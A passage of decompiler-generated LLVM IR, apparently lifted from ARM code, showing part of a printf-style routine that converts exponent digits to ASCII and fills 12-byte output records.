  store i1 %v8_16ec0, i1* %cpsr_z.global-to-local, align 1
  %v5_16ec4 = icmp slt i32 %v0_16eb4, -4
  br i1 %v5_16ec4, label %.thread24, label %bb209

.thread24:                                        ; preds = %bb208
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

bb209:                                            ; preds = %bb208
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16ec8 = icmp eq i1 %not.v7_16eb8, false
  store i1 %v2_16ec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ec8, label %.thread, label %bb210

.thread:                                          ; preds = %.thread24, %bb209
  %v1_16ecc29 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_16ecc29, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_16eec

bb210:                                            ; preds = %bb209
  %v3_16ed0 = sub i32 %v1_16eb4, %v0_16eb4
  store i32 %v3_16ed0, i32* %r8.global-to-local, align 4
  store i32 102, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_16ef8

dec_label_pc_16ee0:                               ; preds = %bb207
  %v0_16ee0 = load i32, i32* %r7.global-to-local, align 4
  %v1_16ee0 = add i32 %v0_16ee0, -102
  %v3_16ee0 = sub i32 101, %v0_16ee0
  %v4_16ee0 = and i32 %v3_16ee0, %v0_16ee0
  %v5_16ee0 = icmp slt i32 %v4_16ee0, 0
  store i1 %v5_16ee0, i1* %cpsr_v.global-to-local, align 1
  %v6_16ee0 = icmp slt i32 %v1_16ee0, 0
  store i1 %v6_16ee0, i1* %cpsr_n.global-to-local, align 1
  %v7_16ee0 = icmp eq i32 %v0_16ee0, 102
  store i1 %v7_16ee0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_16ee0, i32* %sl.global-to-local, align 4
  br i1 %v7_16ee0, label %dec_label_pc_16ee0.dec_label_pc_16ef8_crit_edge, label %dec_label_pc_16eec

dec_label_pc_16ee0.dec_label_pc_16ef8_crit_edge:  ; preds = %dec_label_pc_16ee0
  %v0_16ef8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16ef8

dec_label_pc_16eec:                               ; preds = %.thread, %dec_label_pc_16ee0
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16f08

dec_label_pc_16ef8:                               ; preds = %bb210, %dec_label_pc_16ee0.dec_label_pc_16ef8_crit_edge
  %v0_16ef8 = phi i32 [ %v0_16ef8.pre, %dec_label_pc_16ee0.dec_label_pc_16ef8_crit_edge ], [ %v0_16eb4, %bb210 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16ef8 = icmp slt i32 %v0_16ef8, 0
  store i1 %v1_16ef8, i1* %cpsr_n.global-to-local, align 1
  %v2_16ef8 = icmp eq i32 %v0_16ef8, 0
  store i1 %v2_16ef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_16ef8, label %bb211, label %bb212

bb211:                                            ; preds = %dec_label_pc_16ef8
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_16f00 = load i32, i32* %r2.global-to-local, align 4
  %v6_16f00 = add i32 %v5_16f00, -1
  %v7_16f00 = inttoptr i32 %v6_16f00 to i8*
  store i8 48, i8* %v7_16f00, align 1
  %v8_16f00 = load i32, i32* %r2.global-to-local, align 4
  %v9_16f00 = add i32 %v8_16f00, -1
  store i32 %v9_16f00, i32* %r2.global-to-local, align 4
  %v0_16f04.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_16f34.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_16f38.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16f38.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb212

bb212:                                            ; preds = %dec_label_pc_16ef8, %bb211
  %v1_16f38.pre = phi i1 [ %v1_16f38.pre.pre, %bb211 ], [ false, %dec_label_pc_16ef8 ]
  %v0_16f38.pre = phi i1 [ %v0_16f38.pre.pre, %bb211 ], [ false, %dec_label_pc_16ef8 ]
  %v1_16f34.pre = phi i32 [ %v1_16f34.pre.pre, %bb211 ], [ %v1_16eac, %dec_label_pc_16ef8 ]
  %v0_16f04 = phi i32 [ %v0_16f04.pre, %bb211 ], [ %v0_16ef8, %dec_label_pc_16ef8 ]
  store i32 %v0_16f04, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16f08

dec_label_pc_16f08:                               ; preds = %dec_label_pc_16eec, %bb212
  %v0_16fd8 = phi i32 [ 0, %dec_label_pc_16eec ], [ %v0_16f04, %bb212 ]
  %v1_16f3c = phi i1 [ false, %dec_label_pc_16eec ], [ %v1_16f38.pre, %bb212 ]
  %v0_16f3c = phi i1 [ false, %dec_label_pc_16eec ], [ %v0_16f38.pre, %bb212 ]
  %v1_16f34 = phi i32 [ %v1_16eac, %dec_label_pc_16eec ], [ %v1_16f34.pre, %bb212 ]
  store i32 1, i32* %stack_var_-168, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_16f14 = ptrtoint i32* %stack_var_-46 to i32
  store i32 %v2_16f14, i32* %r3.global-to-local, align 4
  %v0_16f20 = load i32, i32* %r2.global-to-local, align 4
  %v1_16f20 = inttoptr i32 %v0_16f20 to i8*
  %v2_16f20 = load i8, i8* %v1_16f20, align 1
  %v3_16f20 = zext i8 %v2_16f20 to i32
  store i32 %v3_16f20, i32* %r3.global-to-local, align 4
  %v5_16f20 = add i32 %v0_16f20, 1
  store i32 %v5_16f20, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_16f20, i32* %stack_var_-46, align 4
  %v2_16f34 = sub i32 %v1_16f34, %v5_16f20
  store i32 %v2_16f34, i32* %r1.global-to-local, align 4
  %v2_16f38 = xor i1 %v1_16f3c, %v0_16f3c
  br i1 %v2_16f38, label %.thread127, label %dec_label_pc_16f40

.thread127:                                       ; preds = %dec_label_pc_16f08
  %v5_16f38 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v5_16f38, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16fe8

dec_label_pc_16f40:                               ; preds = %dec_label_pc_16f08
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_16f44 = sub i32 %v0_16fd8, %v2_16f34
  %v4_16f44 = xor i32 %v2_16f34, %v0_16fd8
  %v5_16f44 = xor i32 %v2_16f44, %v0_16fd8
  %v6_16f44 = and i32 %v5_16f44, %v4_16f44
  %v7_16f44 = icmp slt i32 %v6_16f44, 0
  store i1 %v7_16f44, i1* %cpsr_v.global-to-local, align 1
  %v8_16f44 = icmp slt i32 %v2_16f44, 0
  store i1 %v8_16f44, i1* %cpsr_n.global-to-local, align 1
  %v9_16f44 = icmp eq i32 %v0_16fd8, %v2_16f34
  store i1 %v9_16f44, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-160, align 4
  %v2_16f50 = xor i1 %v8_16f44, %v7_16f44
  br i1 %v2_16f50, label %bb214, label %dec_label_pc_16f54

dec_label_pc_16f54:                               ; preds = %dec_label_pc_16f40
  store i32 %v2_16f44, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_16f44, i1* %cpsr_n.global-to-local, align 1
  %v2_16f58 = icmp eq i32 %v2_16f44, 0
  store i1 %v2_16f58, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_16bb8, i32* %lr.global-to-local, align 4
  %tmp213 = icmp slt i32 %v2_16f44, 1
  br i1 %tmp213, label %.thread129, label %dec_label_pc_16f6c

.thread129:                                       ; preds = %dec_label_pc_16f54
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16fe4

dec_label_pc_16f6c:                               ; preds = %dec_label_pc_16f54
  store i32 ptrtoint (i32* @global_var_2420b.1273 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_16f78 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_16f78, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-148, align 4
  br label %dec_label_pc_16fe8

bb214:                                            ; preds = %dec_label_pc_16f40
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16fc4 = icmp slt i32 %v0_16fd8, 0
  store i1 %v1_16fc4, i1* %cpsr_n.global-to-local, align 1
  %v2_16fc4 = icmp eq i32 %v0_16fd8, 0
  store i1 %v2_16fc4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_16bb8, i32* %lr.global-to-local, align 4
  %tmp215 = icmp slt i32 %v0_16fd8, 1
  br i1 %tmp215, label %dec_label_pc_16fe4, label %dec_label_pc_16fd4

dec_label_pc_16fd4:                               ; preds = %bb214
  %v2_16fd8 = sub i32 %v2_16f34, %v0_16fd8
  store i32 %v2_16fd8, i32* %r1.global-to-local, align 4
  %v2_16fdc = add i32 %v5_16f20, %v0_16fd8
  store i32 %v2_16fdc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16fe4

dec_label_pc_16fe4:                               ; preds = %dec_label_pc_16fd4, %.thread129, %bb214
  %storemerge141.in = phi i32* [ %stack_var_-160, %bb214 ], [ %stack_var_-148, %.thread129 ], [ %stack_var_-148, %dec_label_pc_16fd4 ]
  %v0_16ff882 = phi i32 [ %v2_16f34, %bb214 ], [ 0, %.thread129 ], [ %v2_16fd8, %dec_label_pc_16fd4 ]
  %storemerge141 = ptrtoint i32* %storemerge141.in to i32
  store i32 %storemerge141, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16fe8

dec_label_pc_16fe8:                               ; preds = %.thread127, %dec_label_pc_16f6c, %dec_label_pc_16fe4
  %v1_17018 = phi i32 [ %v2_16f78, %dec_label_pc_16f6c ], [ %storemerge141, %dec_label_pc_16fe4 ], [ %v5_16f38, %.thread127 ]
  %v0_1703090 = phi i32 [ -1, %dec_label_pc_16f6c ], [ -1, %dec_label_pc_16fe4 ], [ %v0_16fd8, %.thread127 ]
  %v0_16ff8 = phi i32 [ 0, %dec_label_pc_16f6c ], [ %v0_16ff882, %dec_label_pc_16fe4 ], [ %v2_16f34, %.thread127 ]
  %v0_16fe8 = load i32, i32* %fp.global-to-local, align 4
  %v1_16fe8 = add i32 %v0_16fe8, 12
  %v2_16fe8 = inttoptr i32 %v1_16fe8 to i32*
  %v3_16fe8 = load i32, i32* %v2_16fe8, align 4
  %v1_16fec = and i32 %v3_16fe8, 16
  store i32 %v1_16fec, i32* %lr.global-to-local, align 4
  %v2_16fec = icmp eq i32 %v1_16fec, 0
  %tmp238 = zext i1 %v2_16fec to i32
  %.230 = xor i32 %tmp238, 1
  store i32 %.230, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_16ff8 = icmp slt i32 %v0_16ff8, 0
  store i1 %v1_16ff8, i1* %cpsr_n.global-to-local, align 1
  %v2_16ff8 = icmp eq i32 %v0_16ff8, 0
  store i1 %v2_16ff8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16ff8, label %bb218, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_16fe8
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17014

bb218:                                            ; preds = %dec_label_pc_16fe8
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_16fec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16fec, label %dec_label_pc_17008, label %dec_label_pc_17014

dec_label_pc_17008:                               ; preds = %bb218
  %v0_17008 = load i32, i32* %r7.global-to-local, align 4
  %v1_17008 = add i32 %v0_17008, -103
  %v3_17008 = sub i32 102, %v0_17008
  %v4_17008 = and i32 %v3_17008, %v0_17008
  %v5_17008 = icmp slt i32 %v4_17008, 0
  store i1 %v5_17008, i1* %cpsr_v.global-to-local, align 1
  %v6_17008 = icmp slt i32 %v1_17008, 0
  store i1 %v6_17008, i1* %cpsr_n.global-to-local, align 1
  %v7_17008 = icmp eq i32 %v0_17008, 103
  store i1 %v7_17008, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17008, label %dec_label_pc_17030, label %bb219

bb219:                                            ; preds = %dec_label_pc_17008
  %v1_1700c = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_1700c = icmp slt i32 %v1_1700c, 0
  store i1 %v2_1700c, i1* %cpsr_n.global-to-local, align 1
  %v3_1700c = icmp eq i32 %v1_1700c, 0
  store i1 %v3_1700c, i1* %cpsr_z.global-to-local, align 1
  %tmp220 = icmp slt i32 %v1_1700c, 1
  br i1 %tmp220, label %dec_label_pc_17030, label %dec_label_pc_17014

dec_label_pc_17014:                               ; preds = %.thread33, %bb218, %bb219
  %v2_17018 = inttoptr i32 %v1_17018 to i32*
  store i32 112, i32* %v2_17018, align 4
  %v1_17020 = load i32, i32* %r6.global-to-local, align 4
  %v2_17020 = add i32 %v1_17020, 4
  %v3_17020 = inttoptr i32 %v2_17020 to i32*
  store i32 1, i32* %v3_17020, align 4
  store i32 ptrtoint (i32* @global_var_24218.1275 to i32), i32* %r3.global-to-local, align 4
  %v1_17028 = load i32, i32* %r6.global-to-local, align 4
  %v2_17028 = add i32 %v1_17028, 8
  %v3_17028 = inttoptr i32 %v2_17028 to i32*
  store i32 ptrtoint (i32* @global_var_24218.1275 to i32), i32* %v3_17028, align 4
  %v0_1702c = load i32, i32* %r6.global-to-local, align 4
  %v1_1702c = add i32 %v0_1702c, 12
  store i32 %v1_1702c, i32* %r6.global-to-local, align 4
  %v0_17030.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17030

dec_label_pc_17030:                               ; preds = %dec_label_pc_17008, %bb219, %dec_label_pc_17014
  %v1_1703c = phi i32 [ %v1_17018, %bb219 ], [ %v1_1702c, %dec_label_pc_17014 ], [ %v1_17018, %dec_label_pc_17008 ]
  %v0_17030 = phi i32 [ %v0_1703090, %bb219 ], [ %v0_17030.pre, %dec_label_pc_17014 ], [ %v0_1703090, %dec_label_pc_17008 ]
  %v1_17030 = add i32 %v0_17030, 1
  store i32 %v1_17030, i32* %ip.global-to-local, align 4
  %v3_17030 = sub i32 0, %v0_17030
  %v4_17030 = and i32 %v1_17030, %v3_17030
  %v5_17030 = icmp slt i32 %v4_17030, 0
  store i1 %v5_17030, i1* %cpsr_v.global-to-local, align 1
  %v6_17030 = icmp slt i32 %v1_17030, 0
  store i1 %v6_17030, i1* %cpsr_n.global-to-local, align 1
  %v7_17030 = icmp eq i32 %v1_17030, 0
  store i1 %v7_17030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17030, label %dec_label_pc_17054, label %dec_label_pc_17038

dec_label_pc_17038:                               ; preds = %dec_label_pc_17030
  %v1_17038 = sub i32 -1, %v0_17030
  %v2_1703c = add i32 %v1_1703c, 4
  %v3_1703c = inttoptr i32 %v2_1703c to i32*
  store i32 %v1_17038, i32* %v3_1703c, align 4
  store i32 ptrtoint (i32* @global_var_2420b.1273 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_17048 = load i32, i32* %r6.global-to-local, align 4
  %v2_17048 = inttoptr i32 %v1_17048 to i32*
  store i32 176, i32* %v2_17048, align 4
  %v0_1704c = load i32, i32* %r3.global-to-local, align 4
  %v1_1704c = load i32, i32* %r6.global-to-local, align 4
  %v2_1704c = add i32 %v1_1704c, 8
  %v3_1704c = inttoptr i32 %v2_1704c to i32*
  store i32 %v0_1704c, i32* %v3_1704c, align 4
  %v0_17050 = load i32, i32* %r6.global-to-local, align 4
  %v1_17050 = add i32 %v0_17050, 12
  store i32 %v1_17050, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17054

dec_label_pc_17054:                               ; preds = %dec_label_pc_17030, %dec_label_pc_17038
  %v2_1705c = phi i32 [ %v1_1703c, %dec_label_pc_17030 ], [ %v1_17050, %dec_label_pc_17038 ]
  %v0_17054 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17054 = icmp slt i32 %v0_17054, 0
  store i1 %v1_17054, i1* %cpsr_n.global-to-local, align 1
  %v2_17054 = icmp eq i32 %v0_17054, 0
  store i1 %v2_17054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17054, label %.thread42, label %bb221

bb221:                                            ; preds = %dec_label_pc_17054
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_1705c = inttoptr i32 %v2_1705c to i32*
  store i32 112, i32* %v3_1705c, align 4
  %v1_17060 = load i32, i32* %r4.global-to-local, align 4
  %v2_17060 = load i32, i32* %r6.global-to-local, align 4
  %v3_17060 = add i32 %v2_17060, 8
  %v4_17060 = inttoptr i32 %v3_17060 to i32*
  store i32 %v1_17060, i32* %v4_17060, align 4
  %v1_17064 = load i32, i32* %r1.global-to-local, align 4
  %v2_17064 = load i32, i32* %r6.global-to-local, align 4
  %v3_17064 = add i32 %v2_17064, 4
  %v4_17064 = inttoptr i32 %v3_17064 to i32*
  store i32 %v1_17064, i32* %v4_17064, align 4
  %v1_17068 = load i32, i32* %r6.global-to-local, align 4
  %v2_17068 = add i32 %v1_17068, 12
  store i32 %v2_17068, i32* %r6.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_17054, %bb221
  %v1_1708c = phi i32 [ %v2_1705c, %dec_label_pc_17054 ], [ %v2_17068, %bb221 ]
  %v0_1706c = load i32, i32* %r7.global-to-local, align 4
  %v1_1706c = add i32 %v0_1706c, -103
  %v3_1706c = sub i32 102, %v0_1706c
  %v4_1706c = and i32 %v3_1706c, %v0_1706c
  %v5_1706c = icmp slt i32 %v4_1706c, 0
  store i1 %v5_1706c, i1* %cpsr_v.global-to-local, align 1
  %v6_1706c = icmp slt i32 %v1_1706c, 0
  store i1 %v6_1706c, i1* %cpsr_n.global-to-local, align 1
  %v7_1706c = icmp eq i32 %v0_1706c, 103
  store i1 %v7_1706c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1706c, label %dec_label_pc_17074, label %dec_label_pc_1707c

dec_label_pc_17074:                               ; preds = %.thread42
  %v0_17074 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17074 = icmp slt i32 %v0_17074, 0
  store i1 %v1_17074, i1* %cpsr_n.global-to-local, align 1
  %v2_17074 = icmp eq i32 %v0_17074, 0
  store i1 %v2_17074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17074, label %dec_label_pc_170a4, label %dec_label_pc_1707c

dec_label_pc_1707c:                               ; preds = %.thread42, %dec_label_pc_17074
  %v0_1707c = load i32, i32* %ip.global-to-local, align 4
  %v1_1707c = load i32, i32* %r1.global-to-local, align 4
  %v2_1707c = sub i32 %v1_1707c, %v0_1707c
  store i32 %v2_1707c, i32* %r3.global-to-local, align 4
  %v1_17080 = load i32, i32* %r8.global-to-local, align 4
  %v2_17080 = sub i32 %v2_1707c, %v1_17080
  %v4_17080 = xor i32 %v1_17080, %v2_1707c
  %v5_17080 = xor i32 %v2_17080, %v2_1707c
  %v6_17080 = and i32 %v5_17080, %v4_17080
  %v7_17080 = icmp slt i32 %v6_17080, 0
  store i1 %v7_17080, i1* %cpsr_v.global-to-local, align 1
  %v8_17080 = icmp slt i32 %v2_17080, 0
  store i1 %v8_17080, i1* %cpsr_n.global-to-local, align 1
  %v9_17080 = icmp eq i32 %v2_1707c, %v1_17080
  store i1 %v9_17080, i1* %cpsr_z.global-to-local, align 1
  %v2_17084 = xor i1 %v8_17080, %v7_17080
  br i1 %v2_17084, label %dec_label_pc_17088, label %dec_label_pc_170a4

dec_label_pc_17088:                               ; preds = %dec_label_pc_1707c
  %v2_17088 = sub i32 %v1_17080, %v2_1707c
  %v2_1708c = add i32 %v1_1708c, 4
  %v3_1708c = inttoptr i32 %v2_1708c to i32*
  store i32 %v2_17088, i32* %v3_1708c, align 4
  store i32 ptrtoint (i32* @global_var_2420b.1273 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_17098 = load i32, i32* %r6.global-to-local, align 4
  %v2_17098 = inttoptr i32 %v1_17098 to i32*
  store i32 176, i32* %v2_17098, align 4
  %v0_1709c = load i32, i32* %r3.global-to-local, align 4
  %v1_1709c = load i32, i32* %r6.global-to-local, align 4
  %v2_1709c = add i32 %v1_1709c, 8
  %v3_1709c = inttoptr i32 %v2_1709c to i32*
  store i32 %v0_1709c, i32* %v3_1709c, align 4
  %v0_170a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_170a0 = add i32 %v0_170a0, 12
  store i32 %v1_170a0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_170a4

dec_label_pc_170a4:                               ; preds = %dec_label_pc_1707c, %dec_label_pc_17074, %dec_label_pc_17088
  %v1_17138.pre.pre = phi i32 [ %v1_1708c, %dec_label_pc_1707c ], [ %v1_1708c, %dec_label_pc_17074 ], [ %v1_170a0, %dec_label_pc_17088 ]
  %v0_170a4 = load i32, i32* %sl.global-to-local, align 4
  %v1_170a4 = add i32 %v0_170a4, -102
  %v3_170a4 = sub i32 101, %v0_170a4
  %v4_170a4 = and i32 %v3_170a4, %v0_170a4
  %v5_170a4 = icmp slt i32 %v4_170a4, 0
  store i1 %v5_170a4, i1* %cpsr_v.global-to-local, align 1
  %v6_170a4 = icmp slt i32 %v1_170a4, 0
  store i1 %v6_170a4, i1* %cpsr_n.global-to-local, align 1
  %v7_170a4 = icmp eq i32 %v0_170a4, 102
  store i1 %v7_170a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_170a4, label %dec_label_pc_1712c, label %dec_label_pc_170ac

dec_label_pc_170ac:                               ; preds = %dec_label_pc_170a4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_170b0 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_170b0 = icmp slt i32 %v0_170b0, 0
  store i1 %v1_170b0, i1* %cpsr_n.global-to-local, align 1
  %v2_170b0 = icmp eq i32 %v0_170b0, 0
  store i1 %v2_170b0, i1* %cpsr_z.global-to-local, align 1
  %v4_170b4 = zext i8 %stack_var_-66.0108114 to i32
  store i32 %v4_170b4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-51, align 4
  %v4_170c4 = sub i32 0, %v0_170b0
  %storemerge140 = select i1 %v1_170b0, i32 %v4_170c4, i32 %v0_170b0
  %tmp239 = ashr i32 %v0_170b0, 31
  %tmp240 = and i32 %tmp239, 2
  %tmp241 = add nuw nsw i32 %tmp240, 43
  store i32 %storemerge140, i32* %r4.global-to-local, align 4
  store i32 %tmp241, i32* %sl.global-to-local, align 4
  %v2_170cc = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_170cc, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_170d4

dec_label_pc_170d4:                               ; preds = %dec_label_pc_17104, %dec_label_pc_170d4, %dec_label_pc_170ac
  %v2_170ec = phi i32 [ %v2_170cc, %dec_label_pc_170ac ], [ %v6_170ec, %dec_label_pc_170d4 ], [ %v6_170ec, %dec_label_pc_17104 ]
  %v0_170e8 = phi i32 [ %storemerge140, %dec_label_pc_170ac ], [ %v2_170f0, %dec_label_pc_170d4 ], [ %v2_170f0, %dec_label_pc_17104 ]
  %v2_170dc = srem i32 %v0_170e8, 10
  %v1_170e0 = add nsw i32 %v2_170dc, 48
  store i32 %v1_170e0, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_170e8, i32* %r0.global-to-local, align 4
  %v1_170ec = trunc i32 %v1_170e0 to i8
  %v3_170ec = add i32 %v2_170ec, -1
  %v4_170ec = inttoptr i32 %v3_170ec to i8*
  store i8 %v1_170ec, i8* %v4_170ec, align 1
  %v5_170ec = load i32, i32* %r5.global-to-local, align 4
  %v6_170ec = add i32 %v5_170ec, -1
  store i32 %v6_170ec, i32* %r5.global-to-local, align 4
  %v0_170f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_170f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_170f0 = sdiv i32 %v0_170f0, %v1_170f0
  store i32 %v2_170f0, i32* %r0.global-to-local, align 4
  %v0_170f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_170f4 = add i32 %v0_170f4, 1
  store i32 %v1_170f4, i32* %r7.global-to-local, align 4
  %v1_170f8 = add i32 %v0_170f4, -2
  %v3_170f8 = sub i32 1, %v0_170f4
  %v4_170f8 = and i32 %v3_170f8, %v1_170f4
  %v5_170f8 = icmp slt i32 %v4_170f8, 0
  store i1 %v5_170f8, i1* %cpsr_v.global-to-local, align 1
  %v6_170f8 = icmp slt i32 %v1_170f8, 0
  store i1 %v6_170f8, i1* %cpsr_n.global-to-local, align 1
  %v7_170f8 = icmp eq i32 %v1_170f4, 3
  store i1 %v7_170f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_170f0, i32* %r4.global-to-local, align 4
  %v7_17100 = icmp slt i32 %v1_170f4, 4
  br i1 %v7_17100, label %dec_label_pc_170d4, label %dec_label_pc_17104

dec_label_pc_17104:                               ; preds = %dec_label_pc_170d4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_17104 = icmp slt i32 %v2_170f0, 0
  store i1 %v1_17104, i1* %cpsr_n.global-to-local, align 1
  %v2_17104 = icmp eq i32 %v2_170f0, 0
  store i1 %v2_17104, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17104, label %dec_label_pc_1710c, label %dec_label_pc_170d4

dec_label_pc_1710c:                               ; preds = %dec_label_pc_17104
  %v1_1710c = add i32 %v5_170ec, -2
  store i32 %v1_1710c, i32* %r3.global-to-local, align 4
  %v0_17110 = load i32, i32* %sl.global-to-local, align 4
  %v1_17110 = trunc i32 %v0_17110 to i8
  %v4_17110 = inttoptr i32 %v1_1710c to i8*
  store i8 %v1_17110, i8* %v4_17110, align 1
  %v0_17114 = load i32, i32* %r3.global-to-local, align 4
  %v1_17114 = add i32 %v0_17114, -1
  store i32 %v1_17114, i32* %r2.global-to-local, align 4
  %v0_17118 = load i32, i32* %r8.global-to-local, align 4
  %v1_17118 = trunc i32 %v0_17118 to i8
  %v4_17118 = inttoptr i32 %v1_17114 to i8*
  store i8 %v1_17118, i8* %v4_17118, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_17120 = load i32, i32* %r6.global-to-local, align 4
  %v1_17120 = inttoptr i32 %v0_17120 to i32*
  store i32 112, i32* %v1_17120, align 4
  %v3_17120 = add i32 %v0_17120, 4
  %v4_17120 = inttoptr i32 %v3_17120 to i32*
  %v5_17120 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_17120, i32* %v4_17120, align 4
  %v0_17124 = load i32, i32* %r2.global-to-local, align 4
  %v1_17124 = load i32, i32* %r6.global-to-local, align 4
  %v2_17124 = add i32 %v1_17124, 8
  %v3_17124 = inttoptr i32 %v2_17124 to i32*
  store i32 %v0_17124, i32* %v3_17124, align 4
  %v0_17128 = load i32, i32* %r6.global-to-local, align 4
  %v1_17128 = add i32 %v0_17128, 12
  store i32 %v1_17128, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1712c

dec_label_pc_1712c:                               ; preds = %dec_label_pc_170a4, %.thread105, %dec_label_pc_1710c
  %v1_17138.pre = phi i32 [ %v2_16ca4, %.thread105 ], [ %v1_17128, %dec_label_pc_1710c ], [ %v1_17138.pre.pre, %dec_label_pc_170a4 ]
  %v2_1712c = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_1712c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17130

dec_label_pc_17130:                               ; preds = %dec_label_pc_17130, %dec_label_pc_1712c
  %v0_17130 = phi i32 [ %v2_1712c, %dec_label_pc_1712c ], [ %v4_17130, %dec_label_pc_17130 ]
  %stack_var_-188.0 = phi i32 [ %v3_16bdc, %dec_label_pc_1712c ], [ %v2_1713c, %dec_label_pc_17130 ]
  %v1_17130 = inttoptr i32 %v0_17130 to i32*
  %v2_17130 = load i32, i32* %v1_17130, align 4
  store i32 %v2_17130, i32* %r3.global-to-local, align 4
  %v4_17130 = add i32 %v0_17130, 12
  store i32 %v4_17130, i32* %r2.global-to-local, align 4
  %v3_17138 = icmp ult i32 %v4_17130, %v1_17138.pre
  %v2_1713c = sub i32 %stack_var_-188.0, %v2_17130
  store i32 %v2_1713c, i32* %ip.global-to-local, align 4
  br i1 %v3_17138, label %dec_label_pc_17130, label %dec_label_pc_17148

dec_label_pc_17148:                               ; preds = %dec_label_pc_17130
  %v3_17148 = load i8, i8* %stack_var_-50, align 1
  %v4_17148 = sext i8 %v3_17148 to i32
  store i32 %v4_17148, i32* %r3.global-to-local, align 4
  store i32 %v4_17148, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1714c = icmp slt i8 %v3_17148, 0
  store i1 %v1_1714c, i1* %cpsr_n.global-to-local, align 1
  %v2_1714c = icmp eq i8 %v3_17148, 0
